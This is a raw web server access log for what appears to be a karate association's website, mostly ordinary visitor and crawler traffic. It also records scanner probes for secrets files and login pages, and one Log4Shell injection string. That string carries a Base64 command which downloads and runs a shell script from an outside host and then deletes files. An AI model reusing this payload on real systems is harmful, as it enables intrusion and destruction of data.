::ffff:203.10.99.204 - - [18/Nov/2022:18:10:54 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [18/Nov/2022:18:17:53 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:54.36.148.243 - - [18/Nov/2022:18:28:41 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:207.46.13.187 - - [18/Nov/2022:18:37:20 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:203.10.99.204 - - [18/Nov/2022:18:38:53 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:66.249.65.147 - - [18/Nov/2022:18:39:30 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:203.10.99.204 - - [18/Nov/2022:18:45:53 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:37.139.53.82 - - [18/Nov/2022:18:51:43 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [18/Nov/2022:18:51:44 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [18/Nov/2022:18:51:45 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:159.89.31.106 - - [18/Nov/2022:18:57:39 +0000] "GET /wp-commentin.php HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
::ffff:203.10.99.204 - - [18/Nov/2022:19:06:53 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:79.132.2.76 - - [18/Nov/2022:19:10:14 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:167.248.133.118 - - [18/Nov/2022:19:10:56 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:167.248.133.118 - - [18/Nov/2022:19:10:56 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.118 - - [18/Nov/2022:19:10:56 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.118 - - [18/Nov/2022:19:10:56 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:95.214.235.205 - - [18/Nov/2022:19:11:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [18/Nov/2022:19:12:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [18/Nov/2022:19:13:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:35.233.62.116 - - [18/Nov/2022:19:16:08 +0000] "GET / HTTP/1.1" 200 58140 "-" "python-requests/2.28.1"
::ffff:77.88.5.134 - - [18/Nov/2022:19:17:38 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:77.88.5.134 - - [18/Nov/2022:19:17:41 +0000] "GET /shinko-katas.html HTTP/1.1" 404 156 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:77.88.5.165 - - [18/Nov/2022:19:32:12 +0000] "GET /shinko-katas.html HTTP/1.1" 404 156 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:203.10.99.204 - - [18/Nov/2022:19:34:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:92.118.39.78 - - [18/Nov/2022:19:40:30 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:203.10.99.204 - - [18/Nov/2022:19:41:53 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:64.62.197.69 - - [18/Nov/2022:19:54:20 +0000] "GET http://api.ipify.org/?format=json HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:51.222.253.6 - - [18/Nov/2022:20:05:38 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:139.162.221.165 - - [18/Nov/2022:20:09:26 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
::ffff:66.249.65.157 - - [18/Nov/2022:20:09:30 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.244.48 - - [18/Nov/2022:20:09:36 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [18/Nov/2022:20:09:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.209.127 - - [18/Nov/2022:20:12:15 +0000] "GET /hudson HTTP/1.1" 404 145 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.153 - - [18/Nov/2022:20:16:19 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.65.250 - - [18/Nov/2022:20:27:58 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:128.199.80.18 - - [18/Nov/2022:20:29:27 +0000] "GET /wp-login.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
::ffff:203.10.99.204 - - [18/Nov/2022:20:30:53 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:167.99.144.251 - - [18/Nov/2022:20:32:15 +0000] "GET /:80:undefined?id= HTTP/1.1" 404 152 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//137.184.207.85:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGN1cmwgLU8gaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGNobW9kIDc3NyBodWguc2g7IHNoIGh1aC5zaDsgdGZ0cCAxOTEuMjM0LjIwMC4yMTYgLWMgZ2V0IGh1aC5zaDsgY2htb2QgNzc3IGh1aC5zaDsgc2ggaHVoLnNoOyB0ZnRwIC1yIGh1aDIuc2ggLWcgMTkxLjIzNC4yMDAuMjE2OyBjaG1vZCA3NzcgaHVoMi5zaDsgc2ggaHVoMi5zaDsgZnRwZ2V0IC12IC11IGFub255bW91cyAtcCBhbm9ueW1vdXMgLVAgMjEgMTkxLjIzNC4yMDAuMjE2IGh1aDEuc2ggaHVoMS5zaDsgc2ggaHVoMS5zaDsgcm0gLXJmIGh1aC5zaCBodWguc2ggaHVoMi5zaCBodWgxLnNoOyBybSAtcmYgKg==}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//137.184.207.85:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGN1cmwgLU8gaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGNobW9kIDc3NyBodWguc2g7IHNoIGh1aC5zaDsgdGZ0cCAxOTEuMjM0LjIwMC4yMTYgLWMgZ2V0IGh1aC5zaDsgY2htb2QgNzc3IGh1aC5zaDsgc2ggaHVoLnNoOyB0ZnRwIC1yIGh1aDIuc2ggLWcgMTkxLjIzNC4yMDAuMjE2OyBjaG1vZCA3NzcgaHVoMi5zaDsgc2ggaHVoMi5zaDsgZnRwZ2V0IC12IC11IGFub255bW91cyAtcCBhbm9ueW1vdXMgLVAgMjEgMTkxLjIzNC4yMDAuMjE2IGh1aDEuc2ggaHVoMS5zaDsgc2ggaHVoMS5zaDsgcm0gLXJmIGh1aC5zaCBodWguc2ggaHVoMi5zaCBodWgxLnNoOyBybSAtcmYgKg==}')"
::ffff:203.10.99.204 - - [18/Nov/2022:20:37:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:95.214.235.205 - - [18/Nov/2022:20:38:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [18/Nov/2022:20:38:43 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [18/Nov/2022:20:41:05 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:192.241.197.119 - - [18/Nov/2022:20:51:01 +0000] "GET /actuator/health HTTP/1.1" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:203.10.99.204 - - [18/Nov/2022:21:01:29 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:188.213.26.125 - - [18/Nov/2022:21:07:50 +0000] "GET /.svn/wc.db HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)"
::ffff:203.10.99.204 - - [18/Nov/2022:21:09:49 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [18/Nov/2022:21:18:09 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [18/Nov/2022:21:26:30 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [18/Nov/2022:21:34:49 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:114.119.152.119 - - [18/Nov/2022:21:38:21 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "https://wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.65.252 - - [18/Nov/2022:21:39:30 +0000] "GET /style.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:141.255.166.2 - - [18/Nov/2022:21:45:29 +0000] "GET / HTTP/1.1" 200 58140 "-" "Hello World"
::ffff:193.47.61.218 - - [18/Nov/2022:21:47:59 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:40.77.167.4 - - [18/Nov/2022:21:59:44 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.152.12 - - [18/Nov/2022:22:00:29 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:203.10.99.204 - - [18/Nov/2022:22:08:09 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:135.125.244.48 - - [18/Nov/2022:22:10:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [18/Nov/2022:22:10:08 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [18/Nov/2022:22:16:29 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:128.14.141.34 - - [18/Nov/2022:22:17:22 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:203.10.99.204 - - [18/Nov/2022:22:24:49 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:96.95.55.142 - - [18/Nov/2022:22:25:44 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:185.254.196.115 - - [18/Nov/2022:22:26:24 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [18/Nov/2022:22:26:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:111.207.155.211 - - [18/Nov/2022:22:28:37 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
::ffff:203.10.99.204 - - [18/Nov/2022:22:33:09 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:128.1.248.42 - - [18/Nov/2022:22:37:18 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:114.119.152.108 - - [18/Nov/2022:22:43:48 +0000] "GET /images/SenseiDave20211120.jpg HTTP/1.1" 404 168 "http://wadokikai.org/instructors.php" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:40.88.21.235 - - [18/Nov/2022:22:52:53 +0000] "GET / HTTP/1.1" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [18/Nov/2022:22:52:53 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:203.10.99.204 - - [18/Nov/2022:22:58:09 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:69.164.220.126 - - [18/Nov/2022:22:59:54 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
::ffff:69.164.220.126 - - [18/Nov/2022:22:59:54 +0000] "GET /events HTTP/1.1" 200 8526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:69.164.220.126 - - [18/Nov/2022:22:59:55 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
::ffff:69.164.220.126 - - [18/Nov/2022:22:59:55 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
::ffff:69.164.220.126 - - [18/Nov/2022:22:59:55 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
::ffff:203.10.99.204 - - [18/Nov/2022:23:06:29 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [18/Nov/2022:23:23:09 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [18/Nov/2022:23:31:29 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:104.200.151.33 - - [18/Nov/2022:23:33:48 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:104.200.151.33 - - [18/Nov/2022:23:33:50 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:104.200.151.33 - - [18/Nov/2022:23:33:52 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:95.214.235.205 - - [18/Nov/2022:23:34:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [18/Nov/2022:23:34:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:64.227.188.179 - - [18/Nov/2022:23:43:38 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:35.89.249.250 - - [18/Nov/2022:23:43:46 +0000] "GET /.well-known/acme-challenge/3FpSQSbLfN5ArGGVcRCPUxzvJrhHRGdayOjy_suEou8 HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:18.117.7.125 - - [18/Nov/2022:23:43:46 +0000] "GET /.well-known/acme-challenge/3FpSQSbLfN5ArGGVcRCPUxzvJrhHRGdayOjy_suEou8 HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.102 - - [18/Nov/2022:23:43:46 +0000] "GET /.well-known/acme-challenge/3FpSQSbLfN5ArGGVcRCPUxzvJrhHRGdayOjy_suEou8 HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:35.89.249.250 - - [18/Nov/2022:23:43:49 +0000] "GET /.well-known/acme-challenge/eobU-QC_gzFsd2RWJ9QOuvi_60mkdYcCuJIWDZe7Xac HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:18.117.7.125 - - [18/Nov/2022:23:43:49 +0000] "GET /.well-known/acme-challenge/eobU-QC_gzFsd2RWJ9QOuvi_60mkdYcCuJIWDZe7Xac HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.107 - - [18/Nov/2022:23:43:49 +0000] "GET /.well-known/acme-challenge/eobU-QC_gzFsd2RWJ9QOuvi_60mkdYcCuJIWDZe7Xac HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:40 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [18/Nov/2022:23:44:41 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
